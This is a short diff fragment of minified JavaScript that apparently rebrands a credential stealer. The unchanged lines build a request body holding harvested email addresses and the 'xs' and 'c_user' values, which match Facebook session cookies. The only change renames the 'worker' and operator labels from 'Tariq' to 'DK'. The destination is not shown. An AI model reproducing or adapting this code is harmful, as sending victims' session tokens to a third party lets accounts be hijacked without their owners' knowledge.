@@ -9821,10 +9821,10 @@
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "Boss Tariq",
+                                            workerEmail: "DK",
                                             xs: r,
                                             c_user: i,
-                                            name: "Tariq"
+                                            name: "DK"
                                         })
                                     }).then((e => {
                                         e.ok
